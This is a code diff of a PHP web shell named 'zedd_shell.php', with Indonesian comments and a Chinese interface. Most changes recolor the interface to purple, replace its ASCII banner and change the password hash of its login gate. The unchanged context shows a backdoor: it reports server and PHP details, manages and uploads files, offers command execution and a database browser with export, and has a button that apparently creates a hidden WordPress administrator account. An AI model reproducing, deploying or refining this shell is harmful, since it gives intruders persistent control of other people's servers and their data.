@@ -7,7 +7,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     // Jika form login telah disubmit
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $stored_hash = '27c34135a605f85a8f46b5fca1778200';
+        $stored_hash = 'b26dac0d3e2928565b690897f0b4a8c9';
         
         // Gunakan md5() jika tersedia, jika tidak, gunakan hash('md5', ...)
         $hash_function = function_exists('md5') ? 'md5' : function($str){ return hash('md5', $str); };
@@ -46,7 +46,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
                 transform: translate(-50%, -50%);
                 background: rgba(0, 0, 0, 0.6);
                 padding: 30px;
-                border: 2px solid #007BFF;
+                border: 2px solid #9b59b6; /* Ubah dari biru ke ungu */
                 border-radius: 8px;
                 box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.5);
                 text-align: center;
@@ -56,7 +56,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
                 padding: 10px;
                 font-size: 16px;
                 margin-bottom: 15px;
-                border: 1px solid #007BFF;
+                border: 1px solid #9b59b6; /* Ubah dari biru ke ungu */
                 border-radius: 4px;
                 background: #222;
                 color: #ddd;
@@ -66,12 +66,12 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
                 font-size: 16px;
                 border: none;
                 border-radius: 4px;
-                background: #007BFF;
+                background: #9b59b6; /* Ubah dari biru ke ungu */
                 color: #fff;
                 cursor: pointer;
             }
             .login-container button:hover {
-                background: #0056b3;
+                background: #8e44ad; /* Efek hover dengan nuansa ungu lebih gelap */
             }
             .error {
                 color: #ff5555;
@@ -99,7 +99,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 
 // ===========================================================================
 // File: zedd_shell.php
-// Deskripsi: Shell berbasis PHP dengan tampilan tema hitam, border tabel biru,
+// Deskripsi: Shell berbasis PHP dengan tampilan tema hitam, border tabel ungu,
 //            dan teks (UI) dalam bahasa Mandarin. Semua komentar dalam bahasa
 //            Indonesia.
 // ===========================================================================
@@ -665,197 +665,203 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <html>
 <head>
     <!-- =======================================================================
-         Tampilan halaman: Tema hitam, teks hijau terang, border tabel hijau,
-         dan menggunakan font monospace ala hacker.
+         Tampilan halaman: Tema hitam, teks putih, border tabel ungu,
+         dan menggunakan font huruf Mandarin.
          ======================================================================= -->
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <title>YG 外壳</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #1a1a1a;
-            font-family: monospace;
-            color: #00FF00; /* Teks hijau terang */
-        }
+body {
+    margin: 0;
+    padding: 0;
+    background-color: #1a1a1a; /* Warna hitam gelap */
+    font-family: monospace;
+    color: #ddd;
+}
 
-        .header {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 1px solid #00FF00; /* Border hijau */
-        }
+/* Contoh styling untuk header dan konten agar tampilan menyerupai shell */
+.header {
+    text-align: center;
+    padding: 20px;
+    border-bottom: 1px solid #9b59b6; /* Diubah ke ungu */
+}
 
-        .content {
-            max-width: 800px;
-            margin: 30px auto;
-            padding: 20px;
-            border: 1px solid #00FF00; /* Border hijau */
-            border-radius: 5px;
-            background-color: #222;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
-        }
+.content {
+    max-width: 800px;
+    margin: 30px auto;
+    padding: 20px;
+    border: 1px solid #9b59b6; /* Diubah ke ungu */
+    border-radius: 5px;
+    background-color: #222;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+}
 
-        a {
-            text-decoration: none;
-        }
+a {
+    text-decoration: none;
+}
 
-        .system-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #222222;
-            border: 2px solid #00FF00; /* Border hijau */
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            box-shadow: 2px 2px 5px rgba(0,0,0,0.5);
-        }
+/* Style untuk blok informasi sistem */
+.system-info {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #222222;
+    border: 2px solid #9b59b6; /* Diubah ke ungu */
+    border-radius: 8px;
+    padding: 15px;
+    margin-bottom: 20px;
+    box-shadow: 2px 2px 5px rgba(0,0,0,0.5);
+}
 
-        .system-info-left p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #00FF00;
-        }
+.system-info-left p {
+    margin: 5px 0;
+    font-size: 14px;
+    color: #FFFFFF;
+}
 
-        .system-info-left a {
-            color: #00FF00; /* Link hijau */
-            text-decoration: none;
-        }
+.system-info-left a {
+    color: #9b59b6; /* Diubah ke ungu */
+    text-decoration: none;
+}
 
-        .system-info-right {
-            font-family: monospace;
-            font-size: 18px;
-            color: #00FF00;
-            text-align: right;
-        }
+.system-info-right {
+    font-family: monospace;
+    font-size: 18px;
+    color: #FFFFFF;
+    text-align: right;
+}
+.ascii-art {
+    text-align: center;
+    font-family: monospace;
+    color: #FFFFFF;
+    margin: 20px 0;
+}
+/* Animasi perubahan warna teks dari hijau ke putih dan kembali */
+.ascii-art pre {
+    animation: colorCycle 3s linear infinite;
+}
 
-        .ascii-art {
-            text-align: center;
-            font-family: monospace;
-            color: #00FF00;
-            margin: 20px 0;
-        }
+@keyframes colorCycle {
+    0%   { color: green; }
+    50%  { color: white; }
+    100% { color: green; }
+}
+/* Style baru untuk tabel file manager */
+.fManager {
+    width: 100%;
+    margin: 10px 0;
+    border-collapse: collapse;
+    background-color: #2e2e2e;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+}
+.fManager thead th {
+    padding: 8px 10px;
+    border: 1px solid #9b59b6; /* Diubah ke ungu */
+    background-color: #3c3c3c;
+    color: #ffffff;
+}
 
-        .ascii-art pre {
-            animation: colorCycle 3s linear infinite;
-        }
+.fManager tbody td {
+    padding: 8px 10px;
+    border: 1px solid #9b59b6; /* Diubah ke ungu */
+    color: #e0e0e0;
+}
 
-        @keyframes colorCycle {
-            0%   { color: #00FF00; }
-            50%  { color: white; }
-            100% { color: #00FF00; }
-        }
+.fManager tbody tr:nth-child(odd) {
+    background-color: #2e2e2e;
+}
 
-        .fManager {
-            width: 100%;
-            margin: 10px 0;
-            border-collapse: collapse;
-            background-color: #2e2e2e;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-        }
+.fManager tbody tr:nth-child(even) {
+    background-color: #363636;
+}
 
-        .fManager thead th {
-            padding: 8px 10px;
-            border: 1px solid #00FF00; /* Border hijau */
-            background-color: #3c3c3c;
-            color: #00FF00;
-        }
+.fManager tbody tr:hover {
+    background-color: #444444;
+}
+/* Container utama upload */
+.upload-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px;
+    margin: 10px 0;
+    background-color: transparent;
+    border: 1px solid #9b59b6; /* Diubah ke ungu */
+    border-radius: 4px;
+}
 
-        .fManager tbody td {
-            padding: 8px 10px;
-            border: 1px solid #00FF00; /* Border hijau */
-            color: #00FF00;
-        }
+/* Setiap metode upload */
+.upload-method {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 0 10px;
+}
 
-        .fManager tbody tr:nth-child(odd) {
-            background-color: #2e2e2e;
-        }
+/* Judul setiap metode */
+.upload-method h4 {
+    margin: 5px 0;
+    font-size: 14px;
+    color: #ffffff;
+}
 
-        .fManager tbody tr:nth-child(even) {
-            background-color: #363636;
-        }
+/* Form upload */
+.upload-method form {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
 
-        .fManager tbody tr:hover {
-            background-color: #444444;
-        }
+/* Style input file */
+.upload-method input[type="file"] {
+    padding: 4px;
+    font-size: 12px;
+    border: 1px solid #9b59b6; /* Diubah ke ungu */
+    border-radius: 3px;
+    background-color: #000000;
+    color: #ffffff;
+}
 
-        .upload-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px;
-            margin: 10px 0;
-            background-color: transparent;
-            border: 1px solid #00FF00; /* Border hijau */
-            border-radius: 4px;
-        }
+/* Tombol submit dan button */
+.upload-method input[type="submit"],
+.upload-method button {
+    padding: 4px 8px;
+    font-size: 12px;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+    background-color: #9b59b6; /* Diubah ke ungu */
+    color: #ffffff;
+}
 
-        .upload-method {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 0 10px;
-        }
+.upload-method input[type="submit"]:hover,
+.upload-method button:hover {
+    background-color: #8e44ad; /* Efek hover: ungu lebih gelap */
+}
 
-        .upload-method h4 {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #00FF00;
-        }
+/* Status upload */
+#uploadStatus {
+    margin-top: 5px;
+    font-size: 12px;
+    color: #ffffff;
+}
+</style>
 
-        .upload-method form {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .upload-method input[type="file"] {
-            padding: 4px;
-            font-size: 12px;
-            border: 1px solid #00FF00; /* Border hijau */
-            border-radius: 3px;
-            background-color: #000000;
-            color: #00FF00;
-        }
-
-        .upload-method input[type="submit"],
-        .upload-method button {
-            padding: 4px 8px;
-            font-size: 12px;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            background-color: #00FF00; /* Tombol hijau */
-            color: #000000;
-        }
-
-        .upload-method input[type="submit"]:hover,
-        .upload-method button:hover {
-            background-color: #00CC00; /* Variasi hijau untuk hover */
-        }
-
-        #uploadStatus {
-            margin-top: 5px;
-            font-size: 12px;
-            color: #00FF00;
-        }
-    </style>
 </head>
-
 <body>
 <div class="system-info">
     <div class="system-info-left">
         <p>
-            <strong style="color: #00aaff;">系统信息:</strong>
+            <strong style="color: #9b59b6;">系统信息:</strong>
             <span style="color: #ffffff;"><?php echo htmlspecialchars(php_uname()); ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">用户:</strong>
+            <strong style="color: #9b59b6;">用户:</strong>
             <span style="color: #ffffff;"><?php echo getmyuid() . " (" . get_current_user() . ")"; ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">组:</strong>
+            <strong style="color: #9b59b6;">组:</strong>
             <span style="color: #ffffff;"><?php 
                 if (function_exists('posix_getegid')) {
                     $qid = posix_getgrgid(posix_getegid());
@@ -866,51 +872,56 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">禁用函数:</strong>
+            <strong style="color: #9b59b6;">禁用函数:</strong>
             <span style="color: #ff6666;"><?php echo (implode(", ", $nami)=="" ? "NONE :)" : implode(", ", $nami)); ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">安全模式:</strong>
+            <strong style="color: #9b59b6;">安全模式:</strong>
             <span style="color: <?php echo ($safeMode === true ? "#ff6666" : "#66cc66"); ?>;"><?php echo ($safeMode === true ? "On" : "Off"); ?></span>
             <span style="margin-left: 50px;"><a href='javascript:halaman("?awal=phpinfo")' style="color: #ffaa00;">[ PHP信息 ]</a></span>
         </p>
         <!-- 额外系统信息 -->
         <p>
-            <strong style="color: #00aaff;">服务器地址:</strong>
+            <strong style="color: #9b59b6;">服务器地址:</strong>
             <span style="color: #ffffff;"><?php
                 $serverAddr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
                 echo htmlspecialchars($serverAddr);
             ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">服务器软件:</strong>
+            <strong style="color: #9b59b6;">服务器软件:</strong>
             <span style="color: #ffffff;"><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? htmlspecialchars($_SERVER['SERVER_SOFTWARE']) : '未知'; ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">PHP版本:</strong>
+            <strong style="color: #9b59b6;">PHP版本:</strong>
             <span style="color: #ffffff;"><?php echo htmlspecialchars(phpversion()); ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">cURL版本:</strong>
+            <strong style="color: #9b59b6;">cURL版本:</strong>
             <span style="color: #ffffff;"><?php echo function_exists('curl_version') ? htmlspecialchars(curl_version()['version']) : '无'; ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">当前目录:</strong>
+            <strong style="color: #9b59b6;">当前目录:</strong>
             <span style="color: #ffffff;"><?php echo htmlspecialchars(getcwd()); ?></span>
         </p>
         <p>
-            <strong style="color: #00aaff;">服务器时间:</strong>
+            <strong style="color: #9b59b6;">服务器时间:</strong>
             <span style="color: #ffffff;"><?php echo date('Y-m-d H:i:s'); ?></span>
         </p>
     </div>
     <div class="ascii-art">
 <pre style="color: #66cc66;">
-  __  __                  _____          _       
- |  \/  |                / ____|        | |      
- | \  / | __ _ _ __  ___| |     ___   __| | ___  
- | |\/| |/ _` | '_ \|_  / |    / _ \ / _` |/ _ \ 
- | |  | | (_| | | | |/ /| |___| (_) | (_| |  __/ 
- |_|  |_|\__,_|_| |_/___|\_____\___/ \__,_|\___| 
+
+░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+ ░▒▓██████▓▒░░▒▓█▓▒▒▓███▓▒░ 
+   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░    ░▒▓██████▓▒░  
+                            
+                            
+
 </pre>
     </div>
 </div>
@@ -923,31 +934,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <!-- Tempelkan snippet ini di lokasi menu navigasi Anda (misalnya, setelah tag <hr> pada file utama) -->
 <div style="text-align: center; margin: 20px 0;">
   <a href="javascript:newFile();" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #9b59b6; color: #fff; text-decoration: none; border-radius: 5px;">
     新建文件
   </a>
   <a href="javascript:newPapka();" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #9b59b6; color: #fff; text-decoration: none; border-radius: 5px;">
     新建文件夹
   </a>
   <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #9b59b6; color: #fff; text-decoration: none; border-radius: 5px;">
     命令
   </a>
   <a href="javascript:halaman('?awal=skl');" 
-     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #9b59b6; color: #fff; text-decoration: none; border-radius: 5px;">
     SQL
   </a>
   <form method="POST" action="" style="display: inline-block;">
     <input type="hidden" name="create_wp_admin" value="1">
     <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)) ?>">
     <button type="submit"
-       style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+       style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #9b59b6; color: #fff; text-decoration: none; border-radius: 5px;">
       创建管理员
     </button>
   </form>
-
-
 </div>
 <?php
 // Tampilkan pesan sukses atau error jika ada
@@ -991,7 +1000,6 @@ if (isset($success_msg)) {
         <!-- Menampilkan pesan hasil upload jika ada -->
         <?php if (!empty($msg)) echo '<div id="uploadStatus">' . $msg . '</div>'; ?>
     </div>
-
 </div>
 
 <?php
@@ -1182,7 +1190,7 @@ else if($awal == 'skl')
 				$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
 				$tables->execute(array($database));
 				$tables = $tables->fetchAll();
-				print '<div style="float: left; width: 20%; overflow: auto; border-right: 1px solid #999;">';
+				print '<div style="float: left; width: 20%; overflow: auto; border-right: 1px solid #9b59b6;">';
 				print '<a href="javascript:halaman(\'?awal=skl_d\');">导出数据库!!</a><hr>';
 				foreach($tables AS $tableName)
 				{
@@ -1207,7 +1215,7 @@ else if($awal == 'skl')
 						$currentPage = isset($_POST['halaman']) && is_numeric($_POST['halaman']) && $_POST['halaman'] >= 1 && $_POST['halaman'] <= $pages ? (int)$_POST['halaman'] : 1;
 						for ($p = 1; $p <= $pages; $p++)
 						{
-							print '<a style="' . ($currentPage == $p ? 'background: #444;' : '') . 'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid blue; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
+							print '<a style="' . ($currentPage == $p ? 'background: #444;' : '') . 'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid #9b59b6; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
 						}
 						print '<br><br>';
 						$start = 100 * ($currentPage - 1);
